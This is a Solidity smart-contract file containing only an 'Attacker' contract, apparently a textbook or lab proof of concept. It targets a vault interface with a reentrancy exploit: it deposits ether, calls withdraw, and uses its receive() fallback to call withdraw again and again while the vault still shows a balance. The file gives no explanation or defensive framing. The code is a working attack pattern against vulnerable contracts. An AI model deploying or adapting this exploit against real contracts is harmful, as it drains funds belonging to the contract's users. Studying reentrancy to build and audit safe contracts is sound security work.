// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
    function getBalance() external view returns (uint256);
}

contract Attacker {
    IVault public vault;

    constructor(address _vaultAddress) {
        vault = IVault(_vaultAddress);
    }

    function attack() public payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (vault.getBalance() > 0) {
            vault.withdraw();
        }
    }
}
